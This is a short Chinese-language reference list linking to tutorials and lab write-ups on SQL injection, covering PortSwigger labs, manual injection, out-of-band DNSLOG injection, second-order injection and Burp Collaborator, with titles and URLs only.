
## 参考资料

- [PortSwigger之SQL注入实验室笔记 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/287481.html)
- [SQL injection - PortSwigger](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-retrieving-hidden-data/sql-injection/lab-retrieve-hidden-data)
- [一篇文章学会手工注入（万字介绍SQL注入）](https://mp.weixin.qq.com/s/RTFrPLDiycU0nwZp4baiKQ)
- [渗透测试---手把手教你SQL注入(4)--DNSLOG外带注入](https://blog.csdn.net/weixin_52796034/article/details/133746733)
- [SQL注入——二次注入的原理 利用以及防御](https://blog.csdn.net/kongzhian/article/details/110001836)
- [Burp Collaborator-带外技术工具 - 知乎](https://zhuanlan.zhihu.com/p/473336511)

